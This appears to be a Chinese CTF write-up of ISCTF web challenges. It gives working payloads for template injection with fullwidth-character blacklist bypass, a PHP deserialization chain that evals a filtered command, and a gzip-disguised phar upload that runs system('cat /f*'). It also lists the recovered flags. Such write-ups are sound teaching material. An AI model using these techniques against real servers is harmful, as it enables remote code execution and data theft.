  它的这些黑名单内容我们可以使用python的全角绕过

  即利用python3为了支持多种语言的输入，会对标识符进行进行标准化

##### 编写payload

```shell
{{ __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() }}
```

```shell
ISCTF{a664e6cf-1379-49be-8df9-ce964dcb70b1}
```

#### 题目答案

##### 最终payload

```shell
{{ __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() }}
```

##### 得到答案

```shell
ISCTF{a664e6cf-1379-49be-8df9-ce964dcb70b1}
```



### **ezpop**

#### 题目信息

> ## ezpop251 pts
>
> 出题人：winter
>
> 院校：福建师范大学
>
> 难度：中等
>
> ------
>
> 单身的小蓝鲨自己构造了很多很多对象，但是他忘记了构造对象时还需要考虑类的问题

#### 解题过程

##### 代码审计

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc();
    }
}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->var4;
        return $function();
    }

    public function __get($arg1) {
        $this->var5->ll2('b2');
    }
}

class anna {
    public $var6;
    public $var7;

    public function __toString() {
        $long = @$this->var6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->var7->tt2) {
            echo "yamada yamada";
        }
    }
}

class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}

class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;
        }
    }
}


if (isset($_POST['ISCTF'])) {
    unserialize($_POST["ISCTF"]);
}else {
    highlight_file(__FILE__);
}
```

**分析**

- **__construct()对象创建时触发**
- **__destruct()对象销毁时触发**
- **__toString()对象被当作字符串时触发**
- **__call()调用不可访问的方法时触发**
- **__get()调用不可访问的属性时触发**
- **__invoke()对象被当作函数调用时触发**
- **pop链：begin.destruct() -> begin.toString() -> flaag.invoke() -> eenndd.get()**
- 我们用**passthru('strings\t/f*');**绕过黑名单，然后编写一个脚本**弱碰撞md5**

##### 编写md5弱碰撞脚本

```python
import hashlib, random, string
y = '666'
while 1:
    x = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
    h = hashlib.md5(hashlib.md5(x.encode()).hexdigest().encode()).hexdigest()
    if h.startswith(y) and not h[3].isdigit() or h.startswith('0'+y) and not h[4].isdigit():
        print(f"md5(md5({x})) === {h} == {y}")
        break
```

```shell
md5(md5(QSOZnIhd)) === 666e47970d6ce91d61ea2dd3f9ef2a64 == 666
```

##### 编写序列化脚本

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc();
    }
}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->var4;
        return $function();
    }

    public function __get($arg1) {
        $this->var5->ll2('b2');
    }
}

class anna {
    public $var6;
    public $var7;

    public function __toString() {
        $long = @$this->var6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->var7->tt2) {
            echo "yamada yamada";
        }
    }
}

class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}

class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;
        }
    }
}

$begin = new begin(null);
$begin->var1 = $begin;

$end = new eenndd();
$end->command = "passthru('strings\t/f*');";

$flaag = new flaag();
$flaag->var10 = $end;
$flaag->var11 = "xH21JVX7";

$begin->var2 = $flaag;

echo urlencode(serialize($begin));
```

```shell
O%3A5%3A%22begin%22%3A2%3A%7Bs%3A4%3A%22var1%22%3Br%3A1%3Bs%3A4%3A%22var2%22%3BO%3A5%3A%22flaag%22%3A2%3A%7Bs%3A5%3A%22var10%22%3BO%3A6%3A%22eenndd%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A24%3A%22passthru%28%27strings%09%2Ff%2A%27%29%3B%22%3B%7Ds%3A5%3A%22var11%22%3Bs%3A8%3A%22xH21JVX7%22%3B%7D%7D
```

##### 发起攻击

```shell
ISCTF=O%3A5%3A%22begin%22%3A2%3A%7Bs%3A4%3A%22var1%22%3Br%3A1%3Bs%3A4%3A%22var2%22%3BO%3A5%3A%22flaag%22%3A2%3A%7Bs%3A5%3A%22var10%22%3BO%3A6%3A%22eenndd%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A24%3A%22passthru%28%27strings%09%2Ff%2A%27%29%3B%22%3B%7Ds%3A5%3A%22var11%22%3Bs%3A8%3A%22xH21JVX7%22%3B%7D%7D
```

```shell
ISCTF{aec64348-812c-4a7a-b52d-66c1a5c16e70}
```

#### 题目答案

##### 最终脚本

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc();
    }
}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->var4;
        return $function();
    }

    public function __get($arg1) {
        $this->var5->ll2('b2');
    }
}

class anna {
    public $var6;
    public $var7;

    public function __toString() {
        $long = @$this->var6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->var7->tt2) {
            echo "yamada yamada";
        }
    }
}

class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}

class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;
        }
    }
}

$begin = new begin(null);
$begin->var1 = $begin;

$end = new eenndd();
$end->command = "passthru('strings\t/f*');";

$flaag = new flaag();
$flaag->var10 = $end;
$flaag->var11 = "xH21JVX7";

$begin->var2 = $flaag;

echo urlencode(serialize($begin));
```

##### 得到答案

```shell
ISCTF{aec64348-812c-4a7a-b52d-66c1a5c16e70}
```



### include_upload

#### 题目信息

> ## include_upload270 pts
>
> 出题人：zhizuijimi
>
> 院校：江西师范大学
>
> 难度：中等
>
> ------
>
> 我的上传比较专一

#### 解题过程

##### 查看源码

```html
<html>
<head>
<meta charset="utf-8">
<title>简单的文件上传</title>

</head>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名：</label>
        <!--<label><input type="text" name="filename" value="请输入你的文件名"></lable>-->
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
        <br>前端是抄的</br>
        <br>限死了图片总安全了吧</br>
        <br>不会就看看美女吧</br>
        <!-- 我把include.php删了-->
</form>
<!-- 图片展示区域 -->
        <div>
                <img src="1.jpg" width="400" height="auto">
        </div>
</body>
```

**分析**

- 查看路由

  ```shell
  /include.php
  ```

  ```php
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  $file = $_GET['file'];
  if(isset($file) && strtolower(substr($file, -4)) == ".png"){
      include'./upload/' . basename($_GET['file']);
      exit;
  }
  ?>
  我还以为你真信
  我还以为你真信
  ```

  - 当我们include一个文件的时候，会调用一个叫做`compile_filename`的方法，持续跟进这个方法会发现最后有一个判断--文件名中是否包含.phar，如果是，则调用`phar_open_from_fp`，这个方法会去判断文件的压缩形式（这题对后缀有限制，所以我们使用gz或者是bzip2进行压缩），如果是gz或bzip2，则解压，并且包含。这里的解压步骤很重要，我们的phar文件内容其实还是可读的，会被题目waf，所以必须进行一次压缩，使得文件内容不可读，从而绕过题目限制，实现rce。

##### 编写脚本

```php
<?php
$phar = new Phar('phar.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('cat /f*');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?>
```

```shell
D:\Environment\php\php-8.4.13\php.exe -d phar.readonly=0 D:\Work\test\php\1\main.php
```

```shell
gzip phar.phar
```

##### 更改后缀

```shell
phar.phar.gz -> phar.phar.png
```

##### 发起攻击

```shell
phar.phar.png
```

```shell
后缀没错 文件存储在: upload/phar.phar.png
```

```shell
/include.php?file=phar.phar.png
```

```shell
ISCTF{07a8d249-408b-4e19-977c-e3a1bdde598a}
```

#### 题目答案

##### 最终脚本

```php
<?php
$phar = new Phar('phar.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('cat /f*');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?>
```

##### 得到答案

```shell
ISCTF{07a8d249-408b-4e19-977c-e3a1bdde598a}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**